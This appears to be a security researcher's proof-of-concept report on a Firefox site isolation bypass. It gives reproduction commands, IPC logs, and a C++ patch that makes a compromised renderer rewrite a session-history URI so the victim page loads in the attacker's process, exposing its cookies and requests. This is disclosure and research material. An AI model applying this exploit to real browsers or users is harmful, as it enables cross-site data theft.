# Site Isolation Bypass in Firefox

- TLDR: a compromised renderer process can force a victim page to be loaded in the compromised renderer process instead of an isolated process. Thus the attacker has access to cookies, fetch requests etc.
    - detectable by the leak sanitizer or the process sanitizer
- tested in Firefox 121 & 128 (gecko-dev master be29044bb9265c8e84bf67bf79f351998318e060)
    - reproducible in optimised builds with(-out) ASAN
    - not reproducible in debug builds, attacker renderer crashes

## Steps to reproduce
- start servers: `ATTACKER=vulns/firefox_force_load/attacker VICTIM=vulns/firefox_force_load/victim tmuxp load server_session.yml`
- open seed page and attacker page (in [firefox directory](./firefox-ipc-fuzzing)): `MOZ_LOG="uxss_logger:5" ./mach run http://127.0.0.2:8080/seed http://127.0.0.1:8080/attacker.html`
    - delete profile before repeating: `rm -rf release/tmp/profile-default/`

logs:
```
[Child 1530782: Main Thread]: I/my_ipc_logger IPCFuzzer: ::mozilla::ipc::StandardURLParams spec, replaced url: http://127.0.0.2:8080/victim.html#32154352
[time: 1716296577380009][1530782->1530557] [PContentChild] Sending  PContent::Msg_ReplaceActiveSessionHistoryEntry
```

## Renderer Patch

```cpp
// release/ipc/ipdl/PContentChild.cpp

auto PContentChild::SendReplaceActiveSessionHistoryEntry(
        const MaybeDiscardedBrowsingContext& context,
        const SessionHistoryInfo& info) -> bool
{
    UniquePtr<IPC::Message> msg__ = PContent::Msg_ReplaceActiveSessionHistoryEntry(MSG_ROUTING_CONTROL);
    IPC::MessageWriter writer__{
            (*(msg__)),
            this};

    // PATCH
    SessionHistoryInfo newInfo(info);
    nsCOMPtr<nsIURI> uri;
    nsresult rv = NS_NewURI(getter_AddRefs(uri), "http://127.0.0.2:8080/victim.html"_ns);
    newInfo.SetURI(uri);

    IPC::WriteParam((&(writer__)), context);
    // Sentinel = 'context'
    ((&(writer__)))->WriteSentinel(199164678);
    IPC::WriteParam((&(writer__)), newInfo);
    // Sentinel = 'info'
    ((&(writer__)))->WriteSentinel(70058413);

    if (mozilla::ipc::LoggingEnabledFor("PContent", mozilla::ipc::ChildSide)) {
        mozilla::ipc::LogMessageForProtocol(
            "PContentChild",
            this->ToplevelProtocol()->OtherPidMaybeInvalid(),
            "Sending ",
            msg__->type(),
            mozilla::ipc::MessageDirection::eSending);
    }
    AUTO_PROFILER_LABEL("PContent::Msg_ReplaceActiveSessionHistoryEntry", OTHER);

    bool sendok__ = ChannelSend(std::move(msg__));
    return sendok__;
}
```

mozconfig:
```
export MOZ_PACKAGE_JSSHELL=1

ac_add_options --with-app-name=firefox
mk_add_options MOZ_APP_NAME=firefox
mk_add_options MOZ_OBJDIR=@TOPSRCDIR@/release

# Enable ASan specific code and build workarounds
ac_add_options --enable-address-sanitizer

# These three are required by ASan
ac_add_options --disable-jemalloc
ac_add_options --disable-crashreporter
ac_add_options --disable-elf-hack

# Keep symbols to symbolize ASan traces later
export MOZ_DEBUG_SYMBOLS=1
ac_add_options --enable-debug-symbols
ac_add_options --disable-install-strip

# Settings for an opt build (preferred)
# The -gline-tables-only ensures that all the necessary debug information for ASan
# is present, but the rest is stripped so the resulting binaries are smaller.
ac_add_options --enable-optimize="-O2 -gline-tables-only"
ac_add_options --disable-debug
```